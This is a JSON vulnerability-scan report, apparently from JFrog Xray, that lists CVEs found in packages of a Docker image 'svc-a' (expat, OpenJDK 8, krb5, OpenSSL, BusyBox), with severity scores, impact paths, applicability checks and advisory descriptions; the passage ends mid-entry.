{
    "artifacts": [
        {
            "general": {
                "name": "svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                "component_id": "svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                "pkg_type": "Docker",
                "path": "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/",
                "sha256": "a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4"
            },
            "issues": [
                {
                    "issue_id": "XRAY-590286",
                    "summary": "libexpat through 2.5.0 allows recursive XML Entity Expansion if XML_DTD is undefined at compile time.",
                    "description": "libexpat through 2.5.0 allows recursive XML Entity Expansion if XML_DTD is undefined at compile time.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-52426",
                            "cwe": [
                                "CWE-776"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-02-09T00:00:00.906Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-52426",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-208661",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JNDI). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JNDI). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21496",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2022-04-20T00:00:00.030Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21496",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607881",
                    "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
                    "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-37371",
                            "cwe": [
                                "NVD-CWE-Other"
                            ],
                            "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                        }
                    ],
                    "created": "2024-06-30T00:00:00.474Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "extended_information": {
                        "short_description": "Insufficient input validation in Kerberos 5 may lead to denial of service when parsing message tokens with invalid length fields.",
                        "full_description": "The `krb5` library is an implementation of the Kerberos Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS` tokens are part of the `Generic Security Services Application Program Interface` (GSS-API) used to provide secure communication between applications. A GSS token is essentially a chunk of data that encapsulates security information required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields, thus leading to denial of service.\n\nThe general structure of a wrap token contains a header, which includes fields such as `Extra Count`, and an encrypted part which includes the message.\n\nFor example, the vulnerability can be exploited in the following cases:\n\n* A wrap token with a 0 value for the `Extra Count` field, which is the header value for padding.\n* A wrap token with no header\n\nNote:\nThis attack rely heavily on the attacker ability to MiTM.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The attacker must be able to intercept the communication between the application and the server.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "description": "The attacker must be able to intercept the communication between the application and the server.",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:krb5-libs:1.17.2-r0",
                            "cve_id": "CVE-2024-37371",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are being called:</p>\n<ul>\n<li><code>gss_unwrap()</code></li>\n<li><code>gss_unwrap_iov()</code></li>\n<li><code>gss_krb5int_unseal_token_v3()</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:krb5-libs:1.17.2-r0",
                            "vulnerability_id": "CVE-2024-37371",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-612402",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21131",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2024-07-18T00:00:00.278Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21131",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-194330",
                    "summary": "build_model in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "description": "build_model in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-22823",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-01-12T00:00:00.638Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-22823",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-22823",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-526979",
                    "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
                    "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-3817",
                            "cwe": [
                                "CWE-834"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2023-08-01T00:00:00.574Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-3817",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-539895",
                    "summary": "A use-after-free vulnerability was discovered in BusyBox v.1.36.1 via a crafted awk pattern in the awk.c copyvar function.",
                    "description": "A use-after-free vulnerability was discovered in BusyBox v.1.36.1 via a crafted awk pattern in the awk.c copyvar function.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-42365",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-11-28T00:00:00.126Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `copyvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the vulnerable `copyvar` function.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-42365",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-180059",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Library). Supported versions that are affected are Java SE: 7u301, 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 4.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Library). Supported versions that are affected are Java SE: 7u301, 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 4.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-2369",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N"
                        }
                    ],
                    "created": "2021-07-22T00:00:00.520Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-2369",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-186864",
                    "summary": "expat 2.1.0 and earlier does not properly handle entities expansion unless an application developer uses the XML_SetEntityDeclHandler function, which allows remote attackers to cause a denial of service (resource consumption), send HTTP requests to intranet servers, or read arbitrary files via a crafted XML document, aka an XML External Entity (XXE) issue.  NOTE: it could be argued that because expat already provides the ability to disable external entity expansion, the responsibility for resolving this issue lies with application developers; according to this argument, this entry should be REJECTed, and each affected application would need its own CVE.",
                    "description": "expat 2.1.0 and earlier does not properly handle entities expansion unless an application developer uses the XML_SetEntityDeclHandler function, which allows remote attackers to cause a denial of service (resource consumption), send HTTP requests to intranet servers, or read arbitrary files via a crafted XML document, aka an XML External Entity (XXE) issue.  NOTE: it could be argued that because expat already provides the ability to disable external entity expansion, the responsibility for resolving this issue lies with application developers; according to this argument, this entry should be REJECTed, and each affected application would need its own CVE.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2013-0340",
                            "cwe": [
                                "CWE-611"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P"
                        }
                    ],
                    "created": "2021-10-10T00:00:00.934Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2013-0340",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195104",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21282",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.834Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21282",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-198320",
                    "summary": "xmlparse.c in Expat (aka libexpat) before 2.4.5 allows attackers to insert namespace-separator characters into namespace URIs.",
